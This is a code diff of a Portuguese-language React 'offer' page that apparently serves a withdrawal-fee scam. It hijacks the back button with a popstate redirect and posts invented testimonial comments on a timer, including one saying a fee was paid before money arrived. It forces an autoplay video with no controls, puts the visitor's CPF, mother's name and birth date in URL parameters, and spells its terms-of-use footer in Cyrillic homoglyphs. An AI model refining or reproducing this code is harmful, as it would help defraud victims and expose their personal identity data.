@@ -66,7 +66,7 @@ function OfferContent() {
   
 
   useEffect(() => {
-    const urlBackRedirect = '/back/index.html'; // Assuming back/index.html is in public
+    const urlBackRedirect = '/back/index.html'; 
     const query = searchParams.toString();
     const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;
 
@@ -80,14 +80,13 @@ function OfferContent() {
     };
     window.addEventListener('popstate', handlePopState);
     return () => window.removeEventListener('popstate', handlePopState);
-  }, [searchParams]);
+  }, []); // Runs once on mount
   
   useEffect(() => {
     const storedState = localStorage.getItem('offerPageState');
     if (storedState) {
       try {
         const state = JSON.parse(storedState);
-        // Removed chat-specific state restoration
         if (state.videoStarted) setVideoStarted(state.videoStarted);
         if (state.videoCompleted) {
             setVideoCompleted(state.videoCompleted);
@@ -114,7 +113,7 @@ function OfferContent() {
   const formatCPF = (cpf: string | undefined) => {
     if (!cpf) return '---';
     const onlyNums = cpf.replace(/\D/g, '');
-    if (onlyNums.length !== 11) return cpf;
+    if (onlyNums.length !== 11) return cpf; // Return original if not 11 digits after cleaning
     return onlyNums.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
   };
 
@@ -122,6 +121,7 @@ function OfferContent() {
     if (!dateStr) return '---';
     const dateOnly = dateStr.split(' ')[0];
     const [year, month, day] = dateOnly.split('-');
+    if (!year || !month || !day || year.length !== 4 || month.length !== 2 || day.length !== 2) return '---'; // Basic validation
     return `${day}/${month}/${year}`;
   };
 
@@ -179,28 +179,34 @@ function OfferContent() {
   }, [initialCpf]);
   
   const handleSaqueButtonClick = () => {
-    const currentParams = new URLSearchParams(searchParams.toString()); // Preserve existing params
+    const newParams = new URLSearchParams(searchParams.toString()); // Preserve existing query params
+
+    // Determine CPF to use: userData.cpf has priority, then initialCpf from the URL
+    const cpfToFormat = userData?.cpf || initialCpf;
+    newParams.set('cpf', formatCPF(cpfToFormat)); // formatCPF handles undefined by returning '---'
+
+    // Set other user data from userData if available; format functions handle undefined inputs
+    newParams.set('nome', formatFullName(userData?.nome));
+    newParams.set('mae', formatFullName(userData?.mae));
+    newParams.set('nascimento', formatDateBR(userData?.nascimento));
     
-    if (userData) {
-      currentParams.set('nome', formatFullName(userData.nome) || '');
-      currentParams.set('cpf', formatCPF(userData.cpf) || initialCpf || '');
-      currentParams.set('mae', formatFullName(userData.mae) || '');
-      currentParams.set('nascimento', formatDateBR(userData.nascimento) || '');
-    } else if (initialCpf) {
-      currentParams.set('cpf', formatCPF(initialCpf) || initialCpf);
-    }
-    
-    router.push(`/chat?${currentParams.toString()}`);
+    const targetUrl = `/chat?${newParams.toString()}`;
+    router.push(targetUrl);
   };
   
   const handleThumbnailClick = async () => {
     if (playerRef.current?.plyr) {
       try {
-        playerRef.current.plyr.muted = false;
-        await playerRef.current.plyr.play(); 
+        playerRef.current.plyr.muted = false; // Unmute first
+        await playerRef.current.plyr.play(); // Then play
         setShowThumbnailOverlay(false);
+        // If autoplay was true and muted, progress might already be enabled.
+        // Ensure it's enabled now that user interacted.
+        if (!progressEnabled) setProgressEnabled(true); 
+        if (!videoStarted) setVideoStarted(true);
       } catch (error) {
         console.error("Error trying to play/unmute video:", error);
+        // Fallback or user notification could be added here
       }
     }
   };
@@ -223,7 +229,7 @@ function OfferContent() {
     const plyr = playerRef.current?.plyr;
     if (plyr) {
       const onTimeUpdate = () => {
-        if (!progressEnabled || videoCompleted || !plyr.duration) return;
+        if (!progressEnabled || videoCompleted || !plyr.duration || plyr.duration === 0) return;
         const percent = (plyr.currentTime / plyr.duration) * 100;
         setProgress(percent);
         if (percent >= 99.9 && !videoCompleted) {
@@ -233,7 +239,8 @@ function OfferContent() {
       const onPlay = () => {
         if (!videoCompleted) { 
           if (!videoStarted) setVideoStarted(true);
-          if (!progressEnabled) setProgressEnabled(true);
+          // Enable progress tracking as soon as play starts, even if initially muted by autoplay
+          if (!progressEnabled) setProgressEnabled(true); 
         } else if (videoCompleted) {
             plyr.pause(); 
         }
@@ -249,8 +256,12 @@ function OfferContent() {
       if (videoCompleted) {
         finalizeProgressAppearance();
         setShowThumbnailOverlay(false); 
-      } else if (videoStarted) {
+      } else if (videoStarted && plyr.autoplay && plyr.muted) { // If autoplay started it muted
+        setProgressEnabled(true); // Progress should reflect muted autoplay
+        setShowThumbnailOverlay(true); // Keep thumbnail for unmuting
+      } else if (videoStarted) { // Video started by user click or unmuted autoplay
         setProgressEnabled(true);
+        setShowThumbnailOverlay(false);
       }
 
 
@@ -266,7 +277,7 @@ function OfferContent() {
         }
       };
     }
-  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]); // playerRef.current added
+  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]); 
 
 
   useEffect(() => {
@@ -296,9 +307,11 @@ function OfferContent() {
     };
     
     const initialTexts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
+    // Only populate initial comments if comments array is empty
     if (comments.length === 0) {
-        initialTexts.forEach(text => createNewComment(text));
+        Promise.all(initialTexts.map(text => createNewComment(text)));
     }
+
 
     const commentInterval = setInterval(() => {
       const messages = [
@@ -314,7 +327,7 @@ function OfferContent() {
     }, 10000); 
 
     return () => clearInterval(commentInterval);
-  }, []); // Removed comments from dependency array
+  }, []); 
 
 
   const plyrSource = useMemo(() => ({
@@ -325,9 +338,9 @@ function OfferContent() {
   const plyrOptions = useMemo(() => ({
     controls: [], 
     hideControls: true,
-    clickToPlay: false, 
-    autoplay: true, 
-    muted: true,    
+    clickToPlay: false, // Manually handle click via overlay
+    autoplay: true, // Autoplay enabled
+    muted: true, // Must be muted for autoplay to work in most browsers   
     playsinline: true,
   }), []);
 
@@ -470,7 +483,6 @@ function OfferContent() {
 
         <footer className="offer-page-footer">Теrmоs dе Usо dе Аvisо dе Рrivасidаdе</footer>
 
-        {/* Old chat modal removed from here, as it's being replaced by the new /chat page */}
       </div>
     </>
   );
@@ -493,3 +505,4 @@ export default function OfferPage() {
     </Suspense>
   );
 }
+
